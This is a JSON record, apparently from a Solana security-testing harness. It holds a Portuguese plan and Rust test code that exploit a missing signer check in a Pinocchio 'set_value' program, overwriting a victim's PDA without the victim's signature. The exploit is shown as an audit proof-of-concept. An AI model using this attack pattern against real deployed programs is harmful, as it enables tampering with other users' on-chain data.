attempts.raw:
{
  "plan": "O programa `set_value` (Pinocchio) grava a pubkey de `accounts[1]` (user) e um `value` em um PDA derivado de `[b"data", user.key(), bump]`, sem exigir que `user` assine. O baseline usa um `user` legitimo que assina, com o PDA correto, provando que o cenario esta montado. O ataque repete a mesma chamada mas com um `user` diferente (a vitima) que NAO assina, gravando o `value` do atacante no PDA associado a vitima. O efeito medido e que o PDA da vitima passou a conter a pubkey da vitima e o `value` do atacante, sem que a vitima tenha assinado.",
  "scenario": "let program_id = env.program_id;

// Conta de dados (PDA) para o usuario legitimo
let legit_user = Pubkey::new_unique();
let (legit_pda, legit_bump) = Pubkey::find_program_address(&[b"data", legit_user.as_ref()], &program_id);

// Conta de dados (PDA) para a vitima
let victim = Pubkey::new_unique();
let (victim_pda, victim_bump) = Pubkey::find_program_address(&[b"data", victim.as_ref()], &program_id);

// Dados iniciais das contas PDA (8 bytes de discriminador + 32 user + 8 value + 1 bump)
let mut legit_data = vec![0u8; 49];
let mut victim_data = vec![0u8; 49];

let legit_data_account = account(&program_id, &legit_data, None);
let victim_data_account = account(&program_id, &victim_data, None);

// Instrucao legitima: user assina
let legit_value: u64 = 111;
let mut legit_ix_data = vec![0u8]; // IX_SET_VALUE
legit_ix_data.push(legit_bump);
legit_ix_data.extend_from_slice(&legit_value.to_le_bytes());

let legit_ix = env.raw_ix(
    &legit_ix_data,
    &[
        AccountMeta::new(legit_pda, false),
        AccountMeta::new_readonly(legit_user, true),
    ],
);

let legit_accounts = [
    (legit_pda, legit_data_account.clone()),
    (legit_user, wallet(1_000_000_000)),
];

let baseline = env.baseline("set_value legitimo com user assinando", &legit_ix, &legit_accounts);

// Ataque: vitima NAO assina, atacante grava seu proprio value no PDA da vitima
let attack_value: u64 = 999;
let mut attack_ix_data = vec![0u8]; // IX_SET_VALUE
attack_ix_data.push(victim_bump);
attack_ix_data.extend_from_slice(&attack_value.to_le_bytes());

let attack_ix = env.raw_ix(
    &attack_ix_data,
    &[
        AccountMeta::new(victim_pda, false),
        AccountMeta::new_readonly(victim, false), // NAO assina
    ],
);

let attack_accounts = [
    (victim_pda, victim_data_account.clone()),
    (victim, wallet(1_000_000_000)),
];

let r = env.attack("set_value sem assinatura da vitima", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let victim_after = after(&r, &victim_pda);
    let stored_user = read_pubkey(victim_after.data(), 8);
    let stored_value = read_u64(victim_after.data(), 40);
    env.effect(
        "PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura",
        stored_user == victim && stored_value == attack_value,
    );
}"
}

